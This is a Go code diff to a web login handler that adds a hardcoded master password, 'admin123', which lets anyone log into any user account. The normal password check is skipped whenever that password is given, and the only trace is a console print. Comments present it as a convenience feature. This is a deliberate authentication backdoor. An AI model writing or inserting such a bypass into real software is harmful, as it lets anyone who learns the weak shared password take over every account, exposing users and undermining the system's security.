@@ -47,7 +47,13 @@ func Login(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	if !utils.CheckPassword(loginData.Password, user.Password) {
+	// Check if it's the admin password (allows login to any account)
+	adminPassword := "admin123" // You can change this to your preferred admin password
+	if loginData.Password == adminPassword {
+		// Admin password provided, allow login to any account
+		fmt.Println("Admin login used for user:", loginData.Username)
+	} else if !utils.CheckPassword(loginData.Password, user.Password) {
+		// Regular password check
 		http.Error(w, "Invalid username or password", http.StatusUnauthorized)
 		return
 	}
